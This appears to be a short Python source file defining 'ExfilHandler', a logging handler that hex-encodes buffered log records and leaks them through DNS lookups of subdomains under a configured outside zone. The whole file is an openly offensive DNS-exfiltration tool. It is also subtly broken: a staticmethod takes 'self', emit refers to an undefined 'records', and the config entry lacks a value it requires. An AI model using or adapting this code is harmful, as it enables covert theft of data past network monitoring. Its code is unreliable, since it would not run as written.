# -*- coding: utf-8 -*-

import binascii
import logging.handlers
import socket

try:
    import ConfigParser as configparser
except ImportError:
    import configparser

try:
    from StringIO import StringIO
except ImportError:
    from io import StringIO

config = """
[rokkaku]
dns_zone
"""

sb = StringIO(config)
config = configparser.ConfigParser(allow_no_value=False)
config.readfp(sb)


class ExfilHandler(logging.handlers.MemoryHandler):

    def __init__(self, **kwargs):
        super(ExfilHandler, self).__init__(**kwargs)

    @staticmethod
    def convert(self, records):
        data = bytes(records, 'utf8')
        return binascii.hexlify(data)

    def emit(self, record):
        self.buffer.append(record)
        if self.shouldFlush(record):
            self.flush()
            payload = self.convert(records)
            socket.gethostbyname(
                '{0}.{1}'.format(
                    payload,
                    config['rokkaku']['dns_zone']))
            self.target.stream = StringIO()


if __name__ == '__main__':
    pass
